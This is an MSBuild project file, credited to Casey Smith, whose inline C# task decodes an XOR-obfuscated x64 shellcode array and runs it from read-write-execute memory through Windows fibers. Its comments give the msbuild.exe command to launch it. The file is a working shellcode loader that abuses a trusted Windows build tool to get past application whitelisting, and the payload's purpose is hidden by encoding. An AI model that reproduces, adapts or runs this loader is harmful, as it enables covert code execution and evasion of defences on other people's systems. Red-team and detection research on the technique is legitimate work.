<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes x64 shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          
          
      [DllImport("kernel32.dll", SetLastError = true)]
              public static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

          [DllImport("kernel32")]
            private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
            
            

              [DllImport("kernel32.dll", SetLastError = true)]
              public extern static IntPtr CreateFiber(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

              [DllImport("kernel32.dll", SetLastError = true)]
              public extern static IntPtr SwitchToFiber(IntPtr fiberAddress);
              
              
              
          public override bool Execute()
          {
                           byte[] shellcode = {
                   0x55, 0xe1, 0x2c, 0x4d, 0x59, 0x41, 0x65, 0xa9, 0xa9, 0xa9, 0xee, 0xfe,
                   0xee, 0xf9, 0xff, 0xfe, 0xf3, 0xe1, 0x9e, 0x7f, 0xc2, 0xe1, 0x24, 0xff,
                   0xc9, 0xe1, 0x24, 0xff, 0xb1, 0xe1, 0x24, 0xff, 0x89, 0xe1, 0x24, 0xdf,
                   0xf9, 0xe1, 0xb8, 0x10, 0xe7, 0xe7, 0xfa, 0x9e, 0x66, 0xe1, 0x9e, 0x69,
                   0x05, 0x95, 0xce, 0xd5, 0xaf, 0x85, 0x89, 0xee, 0x6e, 0x66, 0xba, 0xee,
                   0xae, 0x6e, 0x4f, 0x5a, 0xff, 0xe1, 0x24, 0xff, 0x89, 0x24, 0xef, 0x95,
                   0xe1, 0xae, 0x79, 0xc3, 0x2e, 0xd1, 0xb1, 0xa4, 0xaf, 0xee, 0xfe, 0xb8,
                   0x22, 0xdf, 0xa9, 0xa9, 0xa9, 0x24, 0x29, 0x21, 0xa9, 0xa9, 0xa9, 0xe1,
                   0x22, 0x69, 0xdd, 0xc0, 0xe1, 0xae, 0x79, 0xed, 0x24, 0xe9, 0x89, 0xf9,
                   0x24, 0xe1, 0xb1, 0xe6, 0xae, 0x79, 0x4c, 0xf3, 0xfa, 0x9e, 0x66, 0xe1,
                   0xa8, 0x66, 0xee, 0x24, 0x9d, 0x21, 0xe1, 0xae, 0x73, 0xe1, 0x9e, 0x69,
                   0x05, 0xee, 0x6e, 0x66, 0xba, 0xee, 0xae, 0x6e, 0x91, 0x49, 0xd2, 0x5e,
                   0xe5, 0xac, 0xe5, 0x8d, 0xa1, 0xe2, 0x96, 0x7e, 0xd2, 0x71, 0xf1, 0xed,
                   0x24, 0xe9, 0x8d, 0xe6, 0xae, 0x79, 0xc3, 0xee, 0x24, 0xa5, 0xe1, 0xed,
                   0x24, 0xe9, 0xb5, 0xe6, 0xae, 0x79, 0xee, 0x24, 0xad, 0x21, 0xe1, 0xae,
                   0x79, 0xee, 0xf1, 0xee, 0xf1, 0xcb, 0xf6, 0xf7, 0xee, 0xf1, 0xee, 0xf6,
                   0xee, 0xf7, 0xe1, 0x2c, 0x45, 0x89, 0xee, 0xff, 0xa8, 0x49, 0xf1, 0xee,
                   0xf6, 0xf7, 0xe1, 0x24, 0xbf, 0x46, 0xe4, 0xa8, 0xa8, 0xa8, 0xca, 0xe6,
                   0x6b, 0xd0, 0xdc, 0x9f, 0xc8, 0x9c, 0x9f, 0xa9, 0xa9, 0xee, 0xf3, 0xe6,
                   0x26, 0x43, 0xe1, 0x2e, 0x45, 0x09, 0xae, 0xa9, 0xa9, 0xe6, 0x26, 0x42,
                   0xe6, 0x15, 0xaf, 0xa9, 0xae, 0x14, 0x69, 0x01, 0x9e, 0x96, 0xee, 0xfd,
                   0xe6, 0x26, 0x4d, 0xe5, 0x26, 0x5e, 0xee, 0x17, 0xe5, 0xd0, 0x83, 0xa0,
                   0xa8, 0x72, 0xe5, 0x26, 0x47, 0xc1, 0xae, 0xae, 0xa9, 0xa9, 0xf6, 0xee,
                   0x17, 0x86, 0x29, 0xc4, 0xa9, 0xa8, 0x72, 0xc7, 0xa7, 0xee, 0xcb, 0xf9,
                   0xf9, 0xfa, 0x9e, 0x66, 0xfa, 0x9e, 0x69, 0xe1, 0xa8, 0x69, 0xe1, 0x26,
                   0x6f, 0xe1, 0xa8, 0x69, 0xe1, 0x26, 0x6e, 0xee, 0x17, 0x47, 0xb8, 0x48,
                   0x49, 0xa8, 0x72, 0xe1, 0x26, 0x60, 0xc7, 0xb9, 0xee, 0xf1, 0xe5, 0x26,
                   0x4f, 0xe1, 0x26, 0x56, 0xee, 0x17, 0x36, 0x02, 0xdd, 0xce, 0xa8, 0x72,
                   0x22, 0x69, 0xdd, 0xa7, 0xe6, 0xa8, 0x7b, 0xd2, 0x42, 0x41, 0x3c, 0xa9,
                   0xa9, 0xa9, 0xe1, 0x2c, 0x45, 0xb9, 0xe1, 0x26, 0x4f, 0xfa, 0x9e, 0x66,
                   0xc7, 0xad, 0xee, 0xf1, 0xe1, 0x26, 0x56, 0xee, 0x17, 0xaf, 0x76, 0x61,
                   0xc8, 0xa8, 0x72, 0x2c, 0x51, 0xa9, 0x2b, 0xf2, 0xe1, 0x2c, 0x6d, 0x89,
                   0xcb, 0x26, 0x53, 0xc7, 0xe9, 0xee, 0xf6, 0xc1, 0xa9, 0xb9, 0xa9, 0xa9,
                   0xee, 0xf1, 0xe1, 0x26, 0x5f, 0xe1, 0x9e, 0x66, 0xee, 0x17, 0xf1, 0x0d,
                   0xfc, 0x42, 0xa8, 0x72, 0xe1, 0x26, 0x6c, 0xe6, 0x26, 0x60, 0xfa, 0x9e,
                   0x66, 0xe6, 0x26, 0x59, 0xe1, 0x26, 0x77, 0xe1, 0x26, 0x56, 0xee, 0x17,
                   0xaf, 0x76, 0x61, 0xc8, 0xa8, 0x72, 0x2c, 0x51, 0xa9, 0x2a, 0x81, 0xf1,
                   0xee, 0xf0, 0xf6, 0xc1, 0xa9, 0xe9, 0xa9, 0xa9, 0xee, 0xf1, 0xc7, 0xa9,
                   0xf7, 0xee, 0x17, 0xa4, 0x98, 0xb8, 0x99, 0xa8, 0x72, 0xf0, 0xf6, 0xee,
                   0x17, 0xd2, 0xdb, 0xfa, 0xce, 0xa8, 0x72, 0xe6, 0xa8, 0x7b, 0x46, 0x95,
                   0xa8, 0xa8, 0xa8, 0xe1, 0xae, 0x6c, 0xe1, 0x86, 0x63, 0xe1, 0x22, 0x53,
                   0xd2, 0x1d, 0xee, 0xa8, 0x40, 0xf1, 0xc7, 0xa9, 0xf6, 0xe6, 0x60, 0x6f,
                   0x59, 0x12, 0x0f, 0xf3, 0xa8, 0x72
                   };

                           for (int i = 0; i < shellcode.Length; i++)
                           {
                           shellcode[i] = (byte)((((uint)shellcode[i] ^ 0xAA) - 3) & 0xFF);
                           }

                IntPtr main_fiber = ConvertThreadToFiber(IntPtr.Zero);
                
                
                IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length,
                  MEM_COMMIT, PAGE_EXECUTE_READWRITE);
               
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
               
              IntPtr buf1_fiber = CreateFiber(0, funcAddr, IntPtr.Zero);
              SwitchToFiber(buf1_fiber);
                
                
                return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>